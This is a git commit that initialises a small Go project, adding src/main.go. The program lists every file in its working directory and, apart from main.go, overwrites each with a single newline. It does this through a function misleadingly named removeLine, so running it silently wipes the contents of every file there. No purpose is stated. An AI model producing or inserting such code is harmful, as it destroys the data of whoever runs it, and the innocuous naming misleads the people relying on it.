24dd5d02132934a1f21f3c8bdfe6024087b67506
Youngermaster <juanmanuel12.13jmyh81@gmail.com>
2022-07-19 11:19:08 -0500

    Project initializated

---
+++ src/main.go
@@ -0,0 +1,34 @@
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"os"
+)
+
+func main() {
+	files, err := ioutil.ReadDir("./")
+	if err != nil {
+		panic(err)
+	}
+	for _, f := range files {
+		fmt.Println(f.Name())
+		if f.Name() == "main.go" {
+
+		} else {
+			start(f.Name())
+		}
+	}
+}
+
+func start(filename string) {
+	path := filename
+	removeLine(path)
+}
+
+func removeLine(path string) {
+
+	info, _ := os.Stat(path)
+	mode := info.Mode()
+	ioutil.WriteFile(path, []byte("\n"), mode)
+}
